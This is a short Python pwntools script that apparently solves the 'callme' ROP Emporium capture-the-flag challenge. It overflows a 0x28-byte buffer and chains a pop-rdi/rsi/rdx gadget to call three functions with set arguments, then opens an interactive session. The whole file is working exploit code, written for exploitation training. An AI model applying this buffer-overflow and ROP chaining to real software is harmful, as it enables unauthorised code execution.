from pwn import *

r = process('callme')

offset = 0x28
#cat_falg_addr = 0xffffd1b0
#cat_flag_code = 'cat flag\n'
#p = cat_flag_code + 'a' * (44 - len(cat_flag_code))

pop_3 = p64(0x0000000000401ab0) # pop rdi ; pop rsi ; pop rdx ; ret

p = 'a' * offset
p += pop_3 + p64(1) + p64(2) + p64(3) + p64(0x00401850)
p += pop_3 + p64(1) + p64(2) + p64(3) + p64(0x00401870)
p += pop_3 + p64(1) + p64(2) + p64(3) + p64(0x00401810)

r.sendline(p)


r.interactive()
